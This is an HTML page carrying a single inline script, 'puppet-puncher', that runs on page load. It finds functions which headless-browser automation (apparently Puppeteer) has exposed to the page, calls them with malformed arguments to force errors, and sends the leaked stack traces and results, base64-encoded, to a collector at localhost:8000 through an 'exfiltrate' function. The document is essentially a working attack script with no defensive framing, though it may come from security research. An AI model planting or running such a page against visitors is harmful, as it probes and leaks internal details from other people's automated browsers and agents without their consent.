<html><head></head><body><script>
(() => {

console.log('Starting puppet-puncher')

function exfiltrate(data) {
  const encoded = btoa(JSON.stringify(data))
  const url = `http://localhost:8000/?x=${encoded}`
  return fetch(url)
}

function reportStack(k, s) {
  console.log(`PUNCHED ${k}! STACK: ${s}`)
  exfiltrate([k, s])
}

try {

  const punchables =
    Object.keys(window)
      .filter(k => typeof window[k] == 'function')
      .filter(k => window[k].toString().indexOf('[bindingName]') != -1)

  punchables.forEach(k => {
    const f = window[k]
    console.log('Found punchable', k)
    // Try to make the mystery function throw an exception
    // You can probably be more imaginative
    // but the payload is sent via JSON serialization
    // so no crazy Proxy objects or Infinity or NaN
    f({'toString': null, '__proto__': null})
      .then(() => f())
      .then(() => f([-1.3e99, "judy", null], "hi", {'toString': null}))
      .then(result => {
        console.log('Punchable did not crash :(', JSON.stringify(result))
        exfiltrate([k, result])
      })
      .catch(e => reportStack(k, e.stack))
  })

} catch(e) {
  console.log('Puppet-puncher crashed', e, e.stack)
}

})()
</script>
